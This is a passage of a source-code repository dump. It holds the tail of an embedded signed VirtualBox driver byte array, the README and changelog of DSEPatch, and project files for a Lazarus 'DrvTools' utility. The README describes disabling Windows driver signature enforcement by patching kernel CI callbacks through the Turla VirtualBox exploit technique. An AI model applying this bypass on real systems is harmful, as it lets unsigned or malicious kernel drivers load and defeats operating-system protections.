    0xAB, 0x13, 0x4C, 0x80, 0x99, 0x26, 0xBC, 0x38, 0xA5, 0xEB, 0x02, 0x36, 0x89, 0x1D, 0xB6, 0x20,
    0xBE, 0x83, 0xAB, 0x10, 0xF8, 0x19, 0x9E, 0xD7, 0x63, 0x79, 0xD4, 0xAE, 0xB1, 0x2F, 0x61, 0x36,
    0xF9, 0x4A, 0x4B, 0xA8, 0x33, 0xC7, 0x0E, 0x72, 0x41, 0xF9, 0xF1, 0xB1, 0x90, 0x7E, 0xAE, 0x46,
    0xEF, 0xDE, 0x39, 0x7B, 0x75, 0xA0, 0x41, 0x14, 0x59, 0x04, 0x1D, 0x42, 0xBC, 0x47, 0x88, 0xB8,
    0x13, 0x0E, 0x05, 0xFA, 0x1D, 0xF0, 0x80, 0x8D, 0xFF, 0x70, 0xC6, 0x77, 0xD8, 0x4B, 0xDC, 0x46,
    0x0E, 0x23, 0x1A, 0x72, 0xD5, 0xBF, 0xDE, 0xFE, 0xAA, 0xAE, 0x69, 0x58, 0x3C, 0xFC, 0x5C, 0x46,
    0xE4, 0xD5, 0x81, 0x9A, 0x8B, 0x6E, 0x65, 0x59, 0x77, 0x1A, 0x32, 0xA5, 0x90, 0xA6, 0xB6, 0x64,
    0x93, 0x64, 0xFD, 0x07, 0x53, 0xC9, 0xA0, 0xDE, 0x28, 0xAD, 0x2A, 0x6C, 0xC6, 0x38, 0xD1, 0x81,
    0xCE, 0x98, 0xF5, 0x40, 0x19, 0xE9, 0x2C, 0x17, 0x43, 0xA4, 0x26, 0x5F, 0xD3, 0x44, 0x30, 0x53,
    0xE4, 0x1D, 0x02, 0xBA, 0xA4, 0x0A, 0x2F, 0x16, 0xDD, 0x7A, 0x60, 0x27, 0x52, 0x42, 0xBB, 0xAD,
    0x98, 0x37, 0x28, 0x97, 0xE4, 0xB8, 0xD2, 0x79, 0x11, 0xE3, 0x10, 0x8C, 0x48, 0xD5, 0x30, 0x5D,
    0x0A, 0x0C, 0x52, 0xDE, 0xF5, 0x88, 0xEA, 0x8D, 0x1A, 0x2D, 0x67, 0xC9, 0xF4, 0x80, 0x14, 0x84,
    0xB7, 0x85, 0x0C, 0xD1, 0x66, 0x28, 0xA5, 0xC6, 0x6F, 0x24, 0x61, 0x31, 0x82, 0x02, 0xEE, 0x30,
    0x82, 0x02, 0xEA, 0x02, 0x01, 0x01, 0x30, 0x72, 0x30, 0x63, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03,
    0x55, 0x04, 0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0A,
    0x13, 0x10, 0x47, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x6E, 0x76, 0x2D,
    0x73, 0x61, 0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x0D, 0x4F, 0x62, 0x6A,
    0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x41, 0x31, 0x21, 0x30, 0x1F, 0x06, 0x03,
    0x55, 0x04, 0x03, 0x13, 0x18, 0x47, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x53, 0x69, 0x67, 0x6E, 0x20,
    0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x41, 0x02, 0x0B, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x17, 0x1C, 0x09, 0x26, 0x65, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E,
    0x03, 0x02, 0x1A, 0x05, 0x00, 0xA0, 0x52, 0x30, 0x10, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01,
    0x82, 0x37, 0x02, 0x01, 0x0C, 0x31, 0x02, 0x30, 0x00, 0x30, 0x19, 0x06, 0x09, 0x2A, 0x86, 0x48,
    0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03, 0x31, 0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82,
    0x37, 0x02, 0x01, 0x04, 0x30, 0x23, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09,
    0x04, 0x31, 0x16, 0x04, 0x14, 0x49, 0x88, 0x0F, 0xEF, 0x5A, 0x54, 0x61, 0x83, 0x2A, 0x6F, 0xA1,
    0xD5, 0xB7, 0x22, 0xCB, 0x12, 0x15, 0x02, 0xC5, 0x9B, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48,
    0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x81, 0x80, 0x64, 0xDB, 0x0F, 0x29, 0x11,
    0xA6, 0x26, 0x63, 0x34, 0x09, 0x62, 0x80, 0xA2, 0x99, 0x36, 0xA3, 0xE1, 0x3B, 0x39, 0x39, 0xEF,
    0x43, 0x52, 0x31, 0x08, 0x5A, 0xEA, 0xA5, 0x79, 0xF3, 0x3A, 0x1C, 0x05, 0xE6, 0x91, 0xDE, 0x22,
    0xE8, 0xE2, 0x41, 0x6C, 0x8D, 0x60, 0x5A, 0x90, 0xDC, 0x7E, 0xC0, 0x42, 0x4B, 0x59, 0x7F, 0xE5,
    0xC5, 0xE2, 0x3C, 0x84, 0x4A, 0xD8, 0x44, 0x58, 0xB2, 0x36, 0x21, 0x14, 0xD9, 0x03, 0x34, 0xFC,
    0x84, 0xFB, 0x34, 0xE0, 0xD3, 0x5A, 0x32, 0x44, 0x48, 0xD7, 0x98, 0x99, 0x81, 0x22, 0x27, 0x9C,
    0x46, 0xC8, 0xD2, 0x02, 0xDF, 0x37, 0x09, 0x27, 0xD5, 0xDE, 0xAB, 0x2C, 0x80, 0xB4, 0x87, 0x7B,
    0xB0, 0xDC, 0xDA, 0x9E, 0x52, 0x2B, 0x66, 0x3D, 0xCF, 0xEC, 0x53, 0x9F, 0xA9, 0x66, 0x44, 0x10,
    0x29, 0x40, 0x82, 0x0A, 0x7C, 0x33, 0x3D, 0xCB, 0x03, 0x86, 0x6F, 0xA1, 0x82, 0x01, 0x7E, 0x30,
    0x82, 0x01, 0x7A, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x06, 0x31, 0x82,
    0x01, 0x6B, 0x30, 0x82, 0x01, 0x67, 0x02, 0x01, 0x01, 0x30, 0x67, 0x30, 0x53, 0x31, 0x0B, 0x30,
    0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x17, 0x30, 0x15, 0x06, 0x03,
    0x55, 0x04, 0x0A, 0x13, 0x0E, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x2C, 0x20, 0x49,
    0x6E, 0x63, 0x2E, 0x31, 0x2B, 0x30, 0x29, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x22, 0x56, 0x65,
    0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x20, 0x53, 0x74, 0x61, 0x6D,
    0x70, 0x69, 0x6E, 0x67, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x43, 0x41,
    0x02, 0x10, 0x38, 0x25, 0xD7, 0xFA, 0xF8, 0x61, 0xAF, 0x9E, 0xF4, 0x90, 0xE7, 0x26, 0xB5, 0xD6,
    0x5A, 0xD5, 0x30, 0x0C, 0x06, 0x08, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x02, 0x05, 0x05, 0x00,
    0xA0, 0x59, 0x30, 0x18, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03, 0x31,
    0x0B, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x01, 0x30, 0x1C, 0x06, 0x09,
    0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x05, 0x31, 0x0F, 0x17, 0x0D, 0x30, 0x38, 0x30,
    0x35, 0x33, 0x31, 0x30, 0x32, 0x31, 0x38, 0x35, 0x35, 0x5A, 0x30, 0x1F, 0x06, 0x09, 0x2A, 0x86,
    0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31, 0x12, 0x04, 0x10, 0x7A, 0x73, 0x26, 0x43, 0x4B,
    0xAD, 0x25, 0x26, 0x53, 0x00, 0x7C, 0x14, 0x01, 0x11, 0x09, 0x65, 0x30, 0x0D, 0x06, 0x09, 0x2A,
    0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x04, 0x81, 0x80, 0x26, 0xCF, 0x68,
    0x33, 0x7B, 0xEB, 0xE5, 0x22, 0xB6, 0x81, 0xBD, 0x64, 0x4D, 0xC1, 0x36, 0x0D, 0xF8, 0x6E, 0x8D,
    0xDA, 0x3A, 0x74, 0x26, 0x22, 0x4A, 0xAC, 0xEC, 0xC8, 0xB5, 0xBD, 0xE7, 0x26, 0x13, 0xF9, 0xF1,
    0x70, 0xDA, 0xF6, 0x69, 0x9A, 0x57, 0xC2, 0xAA, 0xE4, 0x5F, 0xEE, 0x53, 0x50, 0x05, 0x77, 0x9B,
    0xF5, 0xE8, 0x04, 0xDE, 0xA0, 0xE3, 0xCE, 0xC2, 0xEC, 0x06, 0x90, 0xB5, 0x4E, 0x81, 0x8C, 0x9F,
    0x4C, 0xAF, 0xFA, 0x5D, 0x13, 0xB4, 0xC1, 0x2F, 0xB6, 0x40, 0x40, 0xAE, 0x94, 0x96, 0xFC, 0x7F,
    0x36, 0xFC, 0x93, 0x55, 0x1E, 0xA4, 0x40, 0xAA, 0x12, 0x32, 0xAE, 0xB5, 0x8B, 0xBE, 0x89, 0x53,
    0x24, 0x03, 0x5C, 0x60, 0x7B, 0x6B, 0x59, 0x73, 0x22, 0xAE, 0xA6, 0x12, 0x13, 0x5B, 0x1B, 0x53,
    0x8F, 0x05, 0x48, 0xC7, 0x2F, 0x53, 0x2B, 0x2F, 0x8A, 0x1F, 0x25, 0xD8, 0x13, 0x00, 0x00, 0x00
};

#endif /* _VBOXDRV_ */

```

`source/DSEPatch/README.md`:

```md

# DSEPatch
## Windows x64 Driver Signature Enforcement Overrider

# System Requirements

x64 Windows Vista/7/8/8.1/10.

Windows 10: warning, see PatchGuard note below.

DSEPatch designed only for x64 Windows.

Administrative privilege is required.

Obsolete, do not use, see PatchGuard note below.

# Build 

DSEPatch comes with full source code.
In order to build from source you need Microsoft Visual Studio 2013 U4 and later versions.

# How it work

It uses WinNT/Turla VirtualBox kernel mode exploit technique to "patch" ntoskrnl callback structure filled by CI.dll. It is named g_CiCallbacks on Windows 7 and SeCiCallbacks on everything above. DSEPatch replaces CiValidateImageHeader and CiValidateImageData callbacks in this structure with stub routine that always return STATUS_SUCCESS. Original state can be restored - run dsepatch with -r command, e.g. dsepatch -r 

AS-IS, no warranty.

# PatchGuard incompatibility

Windows 10 PatchGuard is aware of this. Bugcheck is 109, 0 - generic data region.

# Authors

(c) 2016 - 2019 DSEPatch Project

```

`source/DSEPatch/changelog.txt`:

```txt
1.0.1 02 Aug 2016
Initial release

1.0.2 14 Apr 2017
Added offsets for RS2, rtls update

1.0.3 11 Oct 2017
Added offsets for RS3

1.0.4 01 May 2018
Added offset for RS4

1.0.5 22 Jan 2019
Added offset for RS5, reacreated in vs17 and did rearrage, rtls update, make it public

```

`source/DrvTools/readme.txt`:

```txt
DrvTools 1.0.2205
Build with Lazarus FPC v3.2

```

`source/DrvTools/src/DrvTools.lpi`:

```lpi
<?xml version="1.0" encoding="UTF-8"?>
<CONFIG>
  <ProjectOptions>
    <Version Value="11"/>
    <PathDelim Value="\"/>
    <General>
      <SessionStorage Value="InProjectDir"/>
      <MainUnit Value="0"/>
      <Title Value="DrvTools"/>
      <Scaled Value="True"/>
      <ResourceType Value="res"/>
      <UseXPManifest Value="True"/>
      <XPManifest>
        <DpiAware Value="True"/>
        <TextName Value="UG North.DrvTools.DrvTools"/>
        <TextDesc Value="Driver Tools"/>
      </XPManifest>
      <Icon Value="0"/>
    </General>
    <VersionInfo>
      <UseVersionInfo Value="True"/>
      <MajorVersionNr Value="1"/>
      <RevisionNr Value="1"/>
      <BuildNr Value="2205"/>
      <Attributes pvaSpecialBuild="True"/>
      <StringTable CompanyName="UG North" FileDescription="Driver Tools Application" InternalName="Saratoga" LegalCopyright="(c) UG North" OriginalFilename="DrvTools.exe" ProductName="DrvTools" ProductVersion="1.0.0.0"/>
    </VersionInfo>
    <BuildModes Count="4">
      <Item1 Name="DebugWin64" Default="True"/>
      <Item2 Name="ReleaseWin64">
        <CompilerOptions>
          <Version Value="11"/>
          <PathDelim Value="\"/>
          <Target>
            <Filename Value="DrvTools64"/>
          </Target>
          <SearchPaths>
            <IncludeFiles Value="$(ProjOutDir)"/>
            <UnitOutputDirectory Value="lib\$(TargetCPU)-$(TargetOS)"/>
          </SearchPaths>
          <CodeGeneration>
            <SmartLinkUnit Value="True"/>
            <TargetCPU Value="x86_64"/>
            <TargetOS Value="win64"/>
            <Optimizations>
              <OptimizationLevel Value="3"/>
            </Optimizations>
          </CodeGeneration>
          <Linking>
            <Debugging>
              <GenerateDebugInfo Value="False"/>
              <StripSymbols Value="True"/>
            </Debugging>
            <LinkSmart Value="True"/>
            <Options>
              <Win32>
                <GraphicApplication Value="True"/>
              </Win32>
            </Options>
          </Linking>
        </CompilerOptions>
      </Item2>
      <Item3 Name="ReleaseWin32">
        <CompilerOptions>
          <Version Value="11"/>
          <PathDelim Value="\"/>
          <Target>
            <Filename Value="DrvTools32"/>
          </Target>
          <SearchPaths>
            <IncludeFiles Value="$(ProjOutDir)"/>
            <UnitOutputDirectory Value="lib\$(TargetCPU)-$(TargetOS)"/>
          </SearchPaths>
          <CodeGeneration>
            <SmartLinkUnit Value="True"/>
            <TargetCPU Value="i386"/>
            <TargetOS Value="win32"/>
            <Optimizations>
              <OptimizationLevel Value="3"/>
            </Optimizations>
            <SmallerCode Value="True"/>
          </CodeGeneration>
          <Linking>
            <Debugging>
              <GenerateDebugInfo Value="False"/>
              <StripSymbols Value="True"/>
            </Debugging>
            <LinkSmart Value="True"/>
            <Options>
              <Win32>
                <GraphicApplication Value="True"/>
              </Win32>
            </Options>
          </Linking>
        </CompilerOptions>
      </Item3>
      <Item4 Name="DebugWin32">
        <CompilerOptions>
          <Version Value="11"/>
          <PathDelim Value="\"/>
          <Target>
            <Filename Value="DrvTools"/>
          </Target>
          <SearchPaths>
            <IncludeFiles Value="$(ProjOutDir)"/>
            <UnitOutputDirectory Value="lib\$(TargetCPU)-$(TargetOS)"/>
          </SearchPaths>
          <Parsing>
            <SyntaxOptions>
              <IncludeAssertionCode Value="True"/>
            </SyntaxOptions>
          </Parsing>
          <CodeGeneration>
            <Checks>
              <IOChecks Value="True"/>
              <RangeChecks Value="True"/>
              <OverflowChecks Value="True"/>
              <StackChecks Value="True"/>
            </Checks>
            <VerifyObjMethodCallValidity Value="True"/>
            <TargetCPU Value="i386"/>
            <TargetOS Value="win32"/>
          </CodeGeneration>
          <Linking>
            <Debugging>
              <DebugInfoType Value="dsDwarf2Set"/>
              <UseHeaptrc Value="True"/>
              <TrashVariables Value="True"/>
              <UseExternalDbgSyms Value="True"/>
            </Debugging>
            <Options>
              <Win32>
                <GraphicApplication Value="True"/>
              </Win32>
            </Options>
          </Linking>
        </CompilerOptions>
      </Item4>
    </BuildModes>
    <PublishOptions>
      <Version Value="2"/>
      <UseFileFilters Value="True"/>
    </PublishOptions>
    <RunParams>
      <FormatVersion Value="2"/>
      <Modes Count="0"/>
    </RunParams>
    <RequiredPackages Count="1">
      <Item1>
        <PackageName Value="LCL"/>
      </Item1>
    </RequiredPackages>
    <Units Count="4">
      <Unit0>
        <Filename Value="DrvTools.lpr"/>
        <IsPartOfProject Value="True"/>
      </Unit0>
      <Unit1>
        <Filename Value="unit1.pas"/>
        <IsPartOfProject Value="True"/>
        <ComponentName Value="MainForm"/>
        <HasResources Value="True"/>
        <ResourceBaseClass Value="Form"/>
        <UnitName Value="Unit1"/>
      </Unit1>
      <Unit2>
        <Filename Value="scmsup.pas"/>
        <IsPartOfProject Value="True"/>
      </Unit2>
      <Unit3>
        <Filename Value="nativesup.pas"/>
        <IsPartOfProject Value="True"/>
      </Unit3>
    </Units>
  </ProjectOptions>
  <CompilerOptions>
    <Version Value="11"/>
    <PathDelim Value="\"/>
    <Target>
      <Filename Value="DrvTools"/>
    </Target>
    <SearchPaths>
      <IncludeFiles Value="$(ProjOutDir)"/>
      <UnitOutputDirectory Value="lib\$(TargetCPU)-$(TargetOS)"/>
    </SearchPaths>
    <Parsing>
      <SyntaxOptions>
        <IncludeAssertionCode Value="True"/>
      </SyntaxOptions>
    </Parsing>
    <CodeGeneration>
      <Checks>
        <IOChecks Value="True"/>
        <OverflowChecks Value="True"/>
        <StackChecks Value="True"/>
      </Checks>
      <VerifyObjMethodCallValidity Value="True"/>
      <TargetCPU Value="x86_64"/>
      <TargetOS Value="win64"/>
    </CodeGeneration>
    <Linking>
      <Debugging>
        <DebugInfoType Value="dsDwarf2Set"/>
        <TrashVariables Value="True"/>
        <UseExternalDbgSyms Value="True"/>
      </Debugging>
      <Options>
        <Win32>
          <GraphicApplication Value="True"/>
        </Win32>
      </Options>
    </Linking>
  </CompilerOptions>
  <Debugging>
    <Exceptions Count="4">
      <Item1>
        <Name Value="EAbort"/>
      </Item1>
      <Item2>
        <Name Value="ECodetoolError"/>
      </Item2>
      <Item3>
        <Name Value="EFOpenError"/>
      </Item3>
      <Item4>
        <Name Value="EConvertError"/>
      </Item4>
    </Exceptions>
  </Debugging>
</CONFIG>

```

`source/DrvTools/src/DrvTools.lpr`:

```lpr
program DrvTools;

{$mode objfpc}{$H+}

uses
  {$IFDEF UNIX}{$IFDEF UseCThreads}
  cthreads,
  {$ENDIF}{$ENDIF}
  Interfaces, // this includes the LCL widgetset
  Forms, Unit1, scmsup, nativesup;

{$R *.res}

begin
  RequireDerivedFormResource:=True;
  Application.Scaled:=True;
  Application.Initialize;
  Application.CreateForm(TMainForm, MainForm);
  Application.Run;
end.


```

`source/DrvTools/src/DrvTools.lps`:

```lps
<?xml version="1.0" encoding="UTF-8"?>
<CONFIG>
  <ProjectSession>
    <PathDelim Value="\"/>
    <Version Value="11"/>
    <BuildModes Active="DebugWin64"/>
    <Units Count="38">
      <Unit0>
        <Filename Value="DrvTools.lpr"/>
        <IsPartOfProject Value="True"/>
        <EditorIndex Value="1"/>
        <CursorPos Y="15"/>
        <UsageCount Value="87"/>
        <Loaded Value="True"/>
      </Unit0>
      <Unit1>
        <Filename Value="unit1.pas"/>
        <IsPartOfProject Value="True"/>
        <ComponentName Value="MainForm"/>
        <HasResources Value="True"/>
        <ResourceBaseClass Value="Form"/>
        <UnitName Value="Unit1"/>
        <IsVisibleTab Value="True"/>
        <TopLine Value="156"/>
        <CursorPos X="31" Y="182"/>
        <UsageCount Value="87"/>
        <Loaded Value="True"/>
        <LoadedDesigner Value="True"/>
      </Unit1>
      <Unit2>
        <Filename Value="scmsup.pas"/>
        <IsPartOfProject Value="True"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="193"/>
        <CursorPos X="16" Y="160"/>
        <UsageCount Value="87"/>
      </Unit2>
      <Unit3>
        <Filename Value="nativesup.pas"/>
        <IsPartOfProject Value="True"/>
        <EditorIndex Value="3"/>
        <CursorPos X="23" Y="9"/>
        <UsageCount Value="87"/>
        <Loaded Value="True"/>
      </Unit3>
      <Unit4>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win64\windows.pp"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="22"/>
        <CursorPos X="6" Y="39"/>
        <UsageCount Value="9"/>
      </Unit4>
      <Unit5>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\packages\winunits-jedi\src\jwawinsvc.pas"/>
        <UnitName Value="JwaWinSvc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="743"/>
        <CursorPos X="10" Y="767"/>
        <UsageCount Value="9"/>
      </Unit5>
      <Unit6>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\packages\winunits-jedi\src\jwawintype.pas"/>
        <UnitName Value="JwaWinType"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="356"/>
        <CursorPos X="3" Y="380"/>
        <UsageCount Value="8"/>
      </Unit6>
      <Unit7>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\func.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="370"/>
        <CursorPos X="11" Y="394"/>
        <UsageCount Value="8"/>
      </Unit7>
      <Unit8>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\nativent\ndk.pas"/>
        <UnitName Value="NDK"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="52"/>
        <CursorPos X="41" Y="96"/>
        <UsageCount Value="9"/>
      </Unit8>
      <Unit9>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\nativent\ndkutils.pas"/>
        <UnitName Value="NDKUtils"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="117"/>
        <UsageCount Value="8"/>
      </Unit9>
      <Unit10>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\nativent\ddk.pas"/>
        <UnitName Value="DDK"/>
        <EditorIndex Value="-1"/>
        <UsageCount Value="8"/>
      </Unit10>
      <Unit11>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\objpas\sysutils\finah.inc"/>
        <EditorIndex Value="-1"/>
        <CursorPos X="10" Y="25"/>
        <UsageCount Value="8"/>
      </Unit11>
      <Unit12>
        <Filename Value="C:\lazarus\lcl\include\control.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="3526"/>
        <CursorPos Y="3545"/>
        <UsageCount Value="11"/>
      </Unit12>
      <Unit13>
        <Filename Value="C:\lazarus\components\lazutils\fileutil.pas"/>
        <UnitName Value="FileUtil"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="46"/>
        <CursorPos X="121" Y="68"/>
        <UsageCount Value="8"/>
      </Unit13>
      <Unit14>
        <Filename Value="C:\lazarus\components\lazutils\lazfileutils.pas"/>
        <UnitName Value="LazFileUtils"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="190"/>
        <CursorPos X="72" Y="44"/>
        <UsageCount Value="8"/>
      </Unit14>
      <Unit15>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\redef.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="605"/>
        <CursorPos X="10" Y="627"/>
        <UsageCount Value="12"/>
      </Unit15>
      <Unit16>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\errors.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="119"/>
        <CursorPos X="31" Y="159"/>
        <UsageCount Value="12"/>
      </Unit16>
      <Unit17>
        <Filename Value="C:\lazarus\lcl\include\customcombobox.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="917"/>
        <CursorPos Y="941"/>
        <UsageCount Value="9"/>
      </Unit17>
      <Unit18>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\inc\systemh.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="84"/>
        <CursorPos X="3" Y="108"/>
        <UsageCount Value="9"/>
      </Unit18>
      <Unit19>
        <Filename Value="ntstatus.pas"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="10674"/>
        <CursorPos X="19" Y="10686"/>
        <UsageCount Value="19"/>
      </Unit19>
      <Unit20>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\base.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="349"/>
        <CursorPos X="19" Y="362"/>
        <UsageCount Value="11"/>
      </Unit20>
      <Unit21>
        <Filename Value="ntstatus.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="4073"/>
        <CursorPos Y="4097"/>
        <UsageCount Value="13"/>
      </Unit21>
      <Unit22>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\objpas\sysutils\sysstrh.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="109"/>
        <CursorPos X="20" Y="124"/>
        <UsageCount Value="9"/>
      </Unit22>
      <Unit23>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\packages\rtl-objpas\src\inc\strutils.pp"/>
        <UnitName Value="StrUtils"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="175"/>
        <UsageCount Value="10"/>
      </Unit23>
      <Unit24>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\ascdef.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="433"/>
        <CursorPos X="150" Y="470"/>
        <UsageCount Value="11"/>
      </Unit24>
      <Unit25>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\objpas\sysutils\syswideh.inc"/>
        <EditorIndex Value="-1"/>
        <CursorPos X="10" Y="34"/>
        <UsageCount Value="10"/>
      </Unit25>
      <Unit26>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\objpas\sysutils\syspchh.inc"/>
        <EditorIndex Value="-1"/>
        <CursorPos X="10" Y="41"/>
        <UsageCount Value="9"/>
      </Unit26>
      <Unit27>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\defines.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="4587"/>
        <CursorPos X="6" Y="4609"/>
        <UsageCount Value="11"/>
      </Unit27>
      <Unit28>
        <Filename Value="C:\lazarus\lcl\comctrls.pp"/>
        <UnitName Value="ComCtrls"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="1742"/>
        <CursorPos X="14" Y="1687"/>
        <UsageCount Value="11"/>
      </Unit28>
      <Unit29>
        <Filename Value="C:\lazarus\lcl\include\listitem.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="509"/>
        <CursorPos Y="533"/>
        <UsageCount Value="10"/>
      </Unit29>
      <Unit30>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\struct.inc"/>
        <EditorIndex Value="4"/>
        <TopLine Value="5658"/>
        <CursorPos X="6" Y="5682"/>
        <UsageCount Value="11"/>
        <Loaded Value="True"/>
      </Unit30>
      <Unit31>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\sysutils.pp"/>
        <UnitName Value="SysUtils"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="82"/>
        <CursorPos X="17" Y="102"/>
        <UsageCount Value="11"/>
      </Unit31>
      <Unit32>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\objpas\sysutils\osutilsh.inc"/>
        <EditorIndex Value="-1"/>
        <CursorPos X="27" Y="23"/>
        <UsageCount Value="11"/>
      </Unit32>
      <Unit33>
        <Filename Value="C:\lazarus\lcl\include\customform.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="921"/>
        <CursorPos Y="943"/>
        <UsageCount Value="10"/>
      </Unit33>
      <Unit34>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\inc\heaph.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="62"/>
        <CursorPos X="65" Y="86"/>
        <UsageCount Value="10"/>
      </Unit34>
      <Unit35>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\unifun.inc"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="449"/>
        <CursorPos X="10" Y="471"/>
        <UsageCount Value="11"/>
      </Unit35>
      <Unit36>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\packages\fcl-base\src\custapp.pp"/>
        <UnitName Value="CustApp"/>
        <EditorIndex Value="-1"/>
        <TopLine Value="77"/>
        <CursorPos X="14" Y="97"/>
        <UsageCount Value="10"/>
      </Unit36>
      <Unit37>
        <Filename Value="C:\lazarus\fpc\3.2.0\source\rtl\win\wininc\messages.inc"/>
        <EditorIndex Value="2"/>
        <TopLine Value="983"/>
        <CursorPos X="6" Y="1006"/>
        <UsageCount Value="11"/>
        <Loaded Value="True"/>
      </Unit37>
    </Units>
    <JumpHistory Count="29" HistoryIndex="28">
      <Position1>
        <Filename Value="unit1.pas"/>
        <Caret Line="1130" Column="7" TopLine="1111"/>
      </Position1>
      <Position2>
        <Filename Value="unit1.pas"/>
        <Caret Line="1316" Column="3" TopLine="1309"/>
      </Position2>
      <Position3>
        <Filename Value="unit1.pas"/>
        <Caret Line="1246" Column="3" TopLine="1242"/>
      </Position3>
      <Position4>
        <Filename Value="unit1.pas"/>
        <Caret Line="1130" Column="7" TopLine="1049"/>
      </Position4>
      <Position5>
        <Filename Value="unit1.pas"/>
        <Caret Line="1126" Column="3" TopLine="1121"/>
      </Position5>
      <Position6>
        <Filename Value="unit1.pas"/>
        <Caret Line="1124" Column="8" TopLine="1121"/>
      </Position6>
      <Position7>
        <Filename Value="unit1.pas"/>
        <Caret Line="1118" Column="25" TopLine="1103"/>
      </Position7>
      <Position8>
        <Filename Value="unit1.pas"/>
        <Caret Line="167" Column="60" TopLine="146"/>
      </Position8>
      <Position9>
        <Filename Value="unit1.pas"/>
        <Caret Line="168" Column="70" TopLine="146"/>
      </Position9>
      <Position10>
        <Filename Value="unit1.pas"/>
        <Caret Line="1122" Column="46" TopLine="1100"/>
      </Position10>
      <Position11>
        <Filename Value="unit1.pas"/>
        <Caret Line="167" TopLine="144"/>
      </Position11>
      <Position12>
